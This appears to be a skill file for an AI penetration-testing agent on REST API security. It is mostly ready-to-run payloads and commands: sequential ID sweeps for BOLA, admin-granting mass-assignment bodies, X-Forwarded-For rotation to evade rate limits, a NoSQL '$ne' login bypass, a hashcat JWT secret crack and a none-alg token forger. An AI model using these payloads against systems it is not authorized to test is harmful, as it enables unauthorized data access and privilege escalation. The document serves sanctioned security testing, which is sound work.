---
name: api-security
description: "REST API security testing covering mass assignment, BOLA, rate limiting bypass, and API versioning attacks"
category: specialized
tier: balanced
toolRefs: [httpRequest, parseResponse, evaluateRendered, findEndpointsInResponse, updateGraph, writeFinding, encodeDecode, followRedirects, recordEvidence, getCapturedHeaders, arjun, runPrimitive]
primitives: [idorSwapper, bolaFuzzer, authzMatrix, tenantIsolation, graphqlBola]
triggers: ["api security testing", "rest api security", "api vulnerability", "mass assignment", "bola", "broken object level authorization", "api rate limit", "api versioning attack", "api enumeration", "api penetration testing"]
contextBoosts: [api]
mitreAttack: ["T1190", "T1046"]
owaspRefs: ["OWASP API Security Top 10 API1:2023 Broken Object Level Authorization", "OWASP Top 10 A01:2021 Broken Access Control"]
---

# REST API Security Testing

## When to Use
- Target exposes REST/GraphQL APIs with structured endpoints (JSON/XML responses)
- Endpoints accept object IDs in path or request body
- Application has multiple user roles (user, admin, moderator)
- API has versioned endpoints (v1, v2, api/v1, etc.)
- OpenAPI/Swagger documentation is publicly accessible
- Rate limiting is suspected but unconfirmed
- JWT, API keys, or OAuth2 tokens are used for authentication

## Do Not Use
- Static file serving (CSS, JS, images) with no API logic
- WebSocket-only endpoints (use dedicated WS testing skills)
- SOAP/XML-RPC APIs (different attack surface)
- Server-rendered HTML pages with no API calls
- When you have zero valid API tokens — acquire one first

## Auth Context

Before making HTTP requests, call **getCapturedHeaders** with the target URL and role to get real headers. Pass these in the `headers` parameter of httpRequest.

Decision tree for API auth mechanisms:

```text
Bearer/JWT header  → test alg downgrade, none-alg, weak secret (see jwt-advanced skill)
API key in header  → test key in URL/referrer leakage, key rotation gaps
OAuth2 bearer      → test scope enforcement, token replay across clients
Basic auth         → test cleartext transport, default creds, brute-force resilience
No auth observed   → probe unauthenticated access to "protected" routes first
```

## API Discovery

### OpenAPI/Swagger Enumeration

Check for exposed API documentation before testing:

Parse discovered schemas to extract all endpoints, parameters, and models. Every endpoint in the schema is a testing target.

```bash
# Probe common spec locations
for p in /openapi.json /swagger.json /api-docs /v2/swagger.json \
         /v3/api-docs /swagger/index.html /api/openapi.yaml; do
  code=$(curl -sS -o /dev/null -w '%{http_code}' "https://target.com$p")
  [ "$code" != "404" ] && echo "$p → $code"
done

# Pull the spec and enumerate every path + method
curl -sS https://target.com/openapi.json | jq -r '.paths | keys[]'
curl -sS https://target.com/openapi.json | jq -r '.paths | to_entries[] |
  .key as $p | .value | keys[] | "\($p) \(.)"'
```

### Common API Paths

Systematically probe these paths for hidden or undocumented endpoints:

```bash
ffuf -u https://target.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt \
     -mc all -fc 404 -H "Authorization: Bearer <token>" -t 20
```

### Version Detection

Test multiple version formats simultaneously:

```http
GET /api/v1/users HTTP/1.1
GET /api/v2/users HTTP/1.1
GET /v1/users HTTP/1.1
GET /api/users?version=1 HTTP/1.1
Accept: application/vnd.target.v1+json
```

## BOLA (Broken Object Level Authorization)

BOLA is the most common API vulnerability. Test by manipulating object references across authorization boundaries.

### Sequential ID Enumeration


```http
# Authenticated as User A (id=1001): swap the object id to another user's
GET /api/v1/orders/5001 HTTP/1.1
Authorization: Bearer <userA-token>

GET /api/v1/orders/5002 HTTP/1.1
Authorization: Bearer <userA-token>
```

```bash
# Sweep a sequential range and diff response sizes — 200s with real data = BOLA
for id in $(seq 5000 5020); do
  curl -sS -o /dev/null -w "%{http_code} %{size_download} id=$id\n" \
    "https://target.com/api/v1/orders/$id" -H "Authorization: Bearer <userA-token>"
done
```

### UUID Manipulation

```http
# UUIDs look unguessable but leak elsewhere: other endpoints, referrals, exports,
# email links, or the user's own profile. Harvest then replay:
GET /api/v1/documents/7c9e6679-7425-40de-944b-e07fc1f90ae7 HTTP/1.1
Authorization: Bearer <userA-token>
```

### Nested Object Access

```http
# Parent resource is authorized, nested child is not re-checked
GET /api/v1/accounts/1001/cards/88 HTTP/1.1     # allowed
GET /api/v1/accounts/1002/cards/91 HTTP/1.1     # BOLA if card 91 belongs to account 1002
```

```json
{"account_id": 1001, "card_id": 91}
```

### Cross-Tenant Access

```http
# Tenant identifier in header or body — swap it while keeping the same session
GET /api/v1/reports HTTP/1.1
Authorization: Bearer <token>
X-Tenant-Id: tenant-a

GET /api/v1/reports HTTP/1.1
Authorization: Bearer <token>
X-Tenant-Id: tenant-b
```

### BOLA Test Protocol

1. Authenticate as User A, capture request to resource R
2. Note all object references: URL IDs, body IDs, query params, headers
3. Authenticate as User B (different role/tenant)
4. Replay User A's request with User B's session token
5. If User A's resource data appears in User B's session → Horizontal BOLA
6. Repeat with regular user accessing admin endpoints → Vertical BOLA
7. Test with no auth token → Unauthenticated BOLA

## Mass Assignment

APIs that bind request body fields directly to internal models are vulnerable to mass assignment.

### Attack Payloads

```http
POST /api/v1/users HTTP/1.1
Content-Type: application/json
Authorization: Bearer <regular-user-token>

{"username": "newuser", "password": "Passw0rd!", "email": "new@example.com",
 "role": "admin", "isAdmin": true}
```

```json
{"name": "attacker", "price": 0, "isVerified": true, "balance": 999999}
{"email": "me@example.com", "accountType": "premium", "quota": -1}
```

### Mass Assignment Vectors

```http
# PATCH with fields the UI never sends — server binds them if the model allows
PATCH /api/v1/users/me HTTP/1.1
Content-Type: application/json

{"email": "me@example.com", "role": "admin"}

# Registration-time privilege grant
POST /api/v1/register HTTP/1.1
Content-Type: application/json

{"username":"x","password":"y","role":"administrator","verified":true}

# Form-encoded variant (some frameworks bind query params too)
POST /api/v1/profile?isAdmin=true HTTP/1.1
Content-Type: application/x-www-form-urlencoded

displayName=x&isAdmin=true
```

### Detection Strategy

```bash
# 1. Register/update normally, capture the response shape of your own object
curl -sS https://target.com/api/v1/users/me -H "Authorization: Bearer <token>" | jq .

# 2. Re-send with injected privileged fields; confirm persistence in the response
curl -sS -X PATCH https://target.com/api/v1/users/me \
  -H "Authorization: Bearer <token>" -H "Content-Type: application/json" \
  -d '{"email":"me@example.com","role":"admin"}' | jq '.role'
# If .role comes back as "admin", mass assignment is CONFIRMED
```

## Rate Limiting Bypass

### IP Rotation Techniques

```http
# If the limiter keys on X-Forwarded-For (or similar), rotate per request:
GET /api/v1/login HTTP/1.1
X-Forwarded-For: 10.0.0.1

GET /api/v1/login HTTP/1.1
X-Forwarded-For: 10.0.0.2

# Variants to test: X-Real-IP, X-Client-IP, True-Client-IP, CF-Connecting-IP,
# Forwarded: for=10.0.0.1, and dual headers with conflicting values
```

### Chunked Transfer Encoding

```http
POST /api/v1/search HTTP/1.1
Transfer-Encoding: chunked

9
query=abc
0

```

Some limiters never re-assemble chunked bodies — each chunk counts as a "small" request.

### Parameter Pollution

```http
# Limiter reads the first value, backend uses the last (or vice versa)
GET /api/v1/items?limit=1&limit=10000 HTTP/1.1
GET /api/v1/items?limit=10000&limit=1 HTTP/1.1
```

### Method-Based Bypass

```http
# Rate-limited on POST but not PUT/PATCH for the same logical action
POST /api/v1/messages        → 429 after N requests
PUT  /api/v1/messages/42     → accepted, no counter
PATCH /api/v1/messages/42    → accepted, no counter
```

### Timing Attacks

```bash
# Measure the limiter window: burst until first 429, then probe at intervals
for i in $(seq 1 120); do curl -sS -o /dev/null -w "%{http_code} " \
  https://target.com/api/v1/items; done; echo
sleep 5 && curl -sS -o /dev/null -w "after-5s: %{http_code}\n" https://target.com/api/v1/items
```

## API Versioning Attacks

### Deprecated Version Testing

```http
# v2 enforces authz; check whether v1 (still routed) skips it
GET /api/v2/users/5001 HTTP/1.1    → 403 Forbidden
GET /api/v1/users/5001 HTTP/1.1    → 200 OK with user data = broken
```

### Version Enumeration

```bash
for v in v0 v1 v2 v3 beta internal test dev legacy old; do
  code=$(curl -sS -o /dev/null -w '%{http_code}' "https://target.com/api/$v/users")
  echo "/api/$v/users → $code"
done
```

## HTTP Method Tampering

### Method Override Headers

```http
POST /api/v1/admin/users HTTP/1.1        → 403 on GET, but:
X-HTTP-Method-Override: GET              → some frameworks re-dispatch

DELETE /api/v1/users/42 HTTP/1.1         → 403
POST /api/v1/users/42 HTTP/1.1
X-HTTP-Method-Override: DELETE           → 204 = bypassed
```

### PATCH Bypass

```http
# Read-only enforcement on PUT but not PATCH:
PUT /api/v1/profile   {"role":"user"}    → 403 (field protected)
PATCH /api/v1/profile {"role":"admin"}   → 200 (role changed)
```

### TRACE Method (XST)

```bash
curl -sS -X TRACE https://target.com/ -i
# 200 with your request echoed (incl. Authorization header) = XST possible
```

## Content-Type Manipulation

### Format Switching

```http
# Same endpoint, alternate serializers — validation often differs per parser
GET /api/v1/users HTTP/1.1
Accept: application/xml

POST /api/v1/search HTTP/1.1
Content-Type: application/x-www-form-urlencoded

query=admin'--
```

### Content-Type Confusion

```http
# JSON body sent as form-urlencoded: strict JSON validators skipped entirely
POST /api/v1/login HTTP/1.1
Content-Type: application/x-www-form-urlencoded

{"username":"admin","password":{"$ne":""}}
```

## Error Information Disclosure

### Verbose Error Probing

```http
POST /api/v1/login HTTP/1.1
Content-Type: application/json

{"username": 123456789012345678901234567890}
```

```json
{"error": "TypeError: Cannot read properties of undefined (reading 'query')",
 "stack": "at UserRepository.find (/app/src/db/user.ts:42:19)"}
```

### Stack Trace Detection

```bash
curl -sS "https://target.com/api/v1/nonexistent?debug=1" | grep -E 'at |Trace|\.java|\.py|\.ts'
```

### Debug Mode Detection

```http
GET /api/v1/items?debug=true HTTP/1.1
GET /api/v1/items HTTP/1.1
X-Debug: 1
```

## JWT/API Key Security

### Token Leakage via URL

```http
# Tokens in query strings leak via referrers, logs, and browser history
GET /api/v1/data?access_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9... HTTP/1.1
```

### Weak Signing Detection

```bash
# Crack HS256 secret from a sample token (dictionary of common secrets)
hashcat -m 16500 jwt.txt -a 0 /usr/share/wordlists/rockyou.txt

# Test the none algorithm (must also flip alg claim)
python3 -c "
import base64,json,hmac,hashlib
h=base64.urlsafe_b64encode(json.dumps({'alg':'none','typ':'JWT'}).encode()).rstrip(b'=')
p=base64.urlsafe_b64encode(json.dumps({'sub':'admin','role':'admin'}).encode()).rstrip(b'=')
print((h+'.'+p+'.').decode())"
```

### Key Rotation Issues

```http
# Revoke a token server-side, then replay it — if still accepted, revocation is cosmetic
Authorization: Bearer <revoked-token>
```

### Algorithm Downgrade

```http
# RS256 endpoint tricked into HS256 verification using the public key as HMAC secret
Authorization: Bearer <hs256-token-signed-with-public-key>
```

## Anti-Hallucination

Your claims will be verified against real tool output. Never fabricate findings.

Every vulnerability you report MUST have a corresponding tool call response that proves it.

If a tool call fails, say so honestly — do not invent a success.

Do NOT claim:
- "Endpoint X is vulnerable to BOLA" without sending requests to two different user IDs
- "Mass assignment exists" without showing the injected field persisted in the response
- "Rate limiting is bypassed" without demonstrating request count exceeds the stated limit
- "Version X is less secure" without testing both versions and comparing responses
- "Content-Type bypass works" without showing different behavior across content types

Do NOT assume:
- A 200 response means the endpoint is vulnerable (check response body for actual data)
- That a 403 means the endpoint is secure (may be returning forbidden for wrong reason)
- That rate limiting is absent just because you sent 10 requests (test with 100+)
- That a version endpoint exists without probing common version patterns

Always verify:
- Response status code AND body content for every request
- That returned data belongs to the authenticated user, not a generic response
- That rate limiting thresholds are measured, not guessed
- That content-type changes produce structurally different responses
- That version differences are in security controls, not just API shape
- That error messages do not leak internal implementation details

## Trigger Conditions

Activate on REST/JSON APIs: endpoints accepting object IDs, multiple user roles, versioned routes, exposed OpenAPI/Swagger, or token/JWT/OAuth auth. Trigger on suspected rate limiting, mass-assignment-prone bodies, or method-tampering surfaces. Do not trigger on static file serving, WebSocket-only or SOAP/XML-RPC endpoints, or when you have zero valid tokens (acquire one first).

## Detection Approach

First discover the surface: probe for Swagger/OpenAPI and common versioned paths (`/api/v1`, `/v2`), then enumerate endpoints from the schema and JS bundles. For BOLA, capture User A's request to a resource, then replay with User B's token (and without a token) — if A's data returns in B's session, horizontal BOLA is confirmed; admin endpoints from a regular user = vertical. For mass assignment, add unexpected model fields (`role`, `isAdmin`) to the request body and check whether they persist in the response. For rate limiting, measure the actual threshold (100+ requests) before claiming bypass, trying IP rotation/parameter pollution/chunked only after confirming a limit exists. For versioning/method tampering, compare deprecated vs current and override-header vs raw method behavior. Always verify status AND body — a 200 with a generic response is not proof.

## Pitfalls

- Claiming BOLA without sending requests across two distinct user IDs/sessions.
- Claiming mass assignment without the injected field persisting in the response.
- Assuming rate limiting is absent after only 10 requests — measure with 100+.
- Treating a 200 as vulnerable without checking the body for real cross-user data.
- Treating a 403 as "secure" — it may mean a missing endpoint, not strong authz.
- Assuming a version endpoint exists without probing common patterns.

## Verification & Impact

CONFIRMED when reproduced evidence shows: cross-user/tenant data returned via ID swap (BOLA), an injected field accepted and persisted (mass assignment), request volume exceeding the stated limit (rate-limit bypass), or a deprecated/override path with weaker controls. SUSPECTED when an anomaly appears but isn't reproduced — record as candidate. Document impact by the API security class (BOLA=API1, BFLA=API5, etc.) and severity (data exposure, privilege gain). Capture request/response pairs and version/control comparisons via `recordEvidence`.

## Primitive Execution

The attack classes above are executable through the primitive registry. Invoke each
primitive by its id below using the run-primitive execution tool instead of re-firing
payloads manually; confirmed results pass through the evidence gate and commit as
findings with exploit proofs automatically.

| Primitive id | Coverage |
|---|---|
| `idorSwapper` | object-reference swap across sessions |
| `bolaFuzzer` | BOLA object-enumeration fuzzing |
| `authzMatrix` | role x endpoint authorization matrix |
| `tenantIsolation` | cross-tenant isolation checks |
| `graphqlBola` | GraphQL object-level authorization abuse |
